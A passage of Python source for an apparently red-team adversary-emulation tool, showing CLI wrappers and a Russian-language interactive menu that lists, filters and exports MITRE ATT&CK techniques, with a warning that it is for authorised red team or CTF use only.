    show_ttps(ttps, title=f"Tactic: {tactic}")


def cli_by_platform(platform: str) -> None:
    ttps = filter_ttps(platform=platform)
    show_ttps(ttps, title=f"Platform: {platform}")


def cli_detail(ttp_id: str) -> None:
    show_ttp_detail(ttp_id)


def cli_tactics() -> None:
    show_tactics_summary()


# ===========================================================================
# Меню
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]⚔  Adversary Emulation (MITRE ATT&CK)[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Все TTPs"),
        ("2", "По тактике"),
        ("3", "По платформе"),
        ("4", "Детали TTP (check commands + detection)"),
        ("5", "Покрытие по тактикам"),
        ("6", "Экспорт JSON"),
        ("7", "Экспорт Markdown playbook"),
        ("8", "Экспорт Navigator layer (для attack-navigator)"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для авторизованного red team / CTF.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        show_ttps(TTPS)
    elif c == "2":
        t = Prompt.ask("Tactic", choices=TACTICS)
        show_ttps(filter_ttps(tactic=t), title=f"Tactic: {t}")
    elif c == "3":
        p = Prompt.ask("Platform", choices=["windows", "linux", "macos"])
        show_ttps(filter_ttps(platform=p), title=f"Platform: {p}")
    elif c == "4":
        show_ttp_detail(Prompt.ask("TTP ID (например T1059.001)"))
    elif c == "5":
        show_tactics_summary()
    elif c == "6":
        export_json(TTPS)
    elif c == "7":
        export_markdown(TTPS)
    elif c == "8":
        export_navigator_layer(TTPS)